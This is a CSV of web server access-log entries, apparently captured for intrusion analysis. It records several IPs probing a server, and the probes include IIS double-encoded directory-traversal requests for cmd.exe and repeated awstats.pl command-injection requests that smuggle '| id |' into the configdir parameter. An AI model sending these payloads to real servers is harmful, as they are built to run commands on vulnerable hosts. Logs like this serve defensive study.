1110809444,access_log,67.170.0.153," ""GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
1110809444,access_log,67.170.0.153," ""GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
1110809444,access_log,67.170.0.153," ""GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110809445,access_log,67.170.0.153," ""GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
1110813217,access_log,222.166.160.3," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110816072,access_log,61.10.7.140," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110819867,access_log,61.232.252.176," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110836931,access_log,219.133.25.250," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110837042,access_log,139.68.4.4," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110839736,access_log,204.102.106.103," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110849888,access_log,61.10.7.68," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110850112,access_log,67.136.86.162," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110851183,access_log,157.91.48.191," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110856839,access_log,67.154.159.190," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
1110863209,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863209,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863210,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863210,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863211,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863214,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1098 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863214,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863215,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863215,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863215,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1098 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863215,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863216,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863216,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863217,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1098 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863217,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863217,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863218,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863218,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863218,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863218,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863218,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863218,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863220,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
